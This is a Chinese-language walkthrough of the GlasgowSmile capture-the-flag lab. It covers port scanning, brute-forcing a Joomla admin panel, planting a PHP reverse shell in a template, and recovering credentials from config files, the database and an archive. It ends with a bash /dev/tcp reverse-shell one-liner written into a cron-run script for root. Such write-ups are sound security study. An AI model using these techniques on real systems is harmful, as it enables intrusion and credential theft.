## GlasgowSmile



## 端口扫描

````shell

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 67:34:48:1f:25:0e:d7:b3:ea:bb:36:11:22:60:8f:a1 (RSA)
|   256 4c:8c:45:65:a4:84:e8:b1:50:77:77:a9:3a:96:06:31 (ECDSA)
|_  256 09:e9:94:23:60:97:f7:20:cc:ee:d6:c1:9b:da:18:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)

````

## 目录扫描

```
扫描到了joomla的目录，对joomla目录简单目录枚举发现了额robots.txt
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```



## 后台cms爆破

```
用 cewl http://192.168.202.139/joomla -w dict.txt收集字典，对后台administrator目录的后台页面进行爆破，最终得到凭据joomla:Gotham
```



## joomla模板写入反弹shell

```shell
Extensions->Templates->Protostar Details and Files->New file创建一个php文件，写入反弹shell

Editing file "/shell.php" in template "protostar".提示了路径，在template/protostar/shell.php

nc -lvnp 4444

然后去到http://192.168.202.139/joomla/templates/protostar/shell.php

成功得到shell
```

## 提权

> 搜索网站配置文件configuration.php

```
public $user = 'joomla';
public $password = 'babyjoker';

得到数据库账号密码
```

> 搜索数据库
>
> ```
> +----+---------+------------+---------+----------------------------------------------+
> | id | type    | date       | name    | pswd                                         |
> +----+---------+------------+---------+----------------------------------------------+
> |  1 | Soldier | 2020-06-14 | Bane    | YmFuZWlzaGVyZQ==                             |
> |  2 | Soldier | 2020-06-14 | Aaron   | YWFyb25pc2hlcmU=                             |
> |  3 | Soldier | 2020-06-14 | Carnage | Y2FybmFnZWlzaGVyZQ==                         |
> |  4 | Soldier | 2020-06-14 | buster  | YnVzdGVyaXNoZXJlZmY=                         |
> |  6 | Soldier | 2020-06-14 | rob     | Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/ |
> |  7 | Soldier | 2020-06-14 | aunt    | YXVudGlzIHRoZSBmdWNrIGhlcmU=                 |
> +----+---------+------------+---------+----------------------------------------------+
> ```
>
> 得到rob凭据
>
> ```
> rob:???AllIHaveAreNegativeThoughts???
> ```
>
> 对rob家目录凯撒加密文件进行解密
>
> ```
>  STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA==
>  得到abner的凭据 
>  
>  abner:I33hope99my0death000makes44more8cents00than0my0life0
>  
> ```
>
> 对隐藏压缩文件进行解密
>
> ```shell
> find / -writable -type f 2>/dev/null | grep -v /proc | grep -v /sys
> 
> 发现可疑文件/var/www/joomla2/administrator/manifests/files/.dear_penguins.zip
> 
> 当前目录无法解压，拷贝到/tmp中
> 
> 得到penguins的凭据scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz
> 
> ```
>
> find提权尝试
>
> ```shell
> ./find . -exec /bin/sh -p \; -quit
> 多次尝试依旧失败
> 
> 发现还有隐藏文件.trash_old，尝试写入反弹shell
> 
> bash -c "bash -i &>/dev/tcp/192.168.202.128/4444 0>&1"
> 
> 等待后提权成功。。
> 
> ```
>
> 















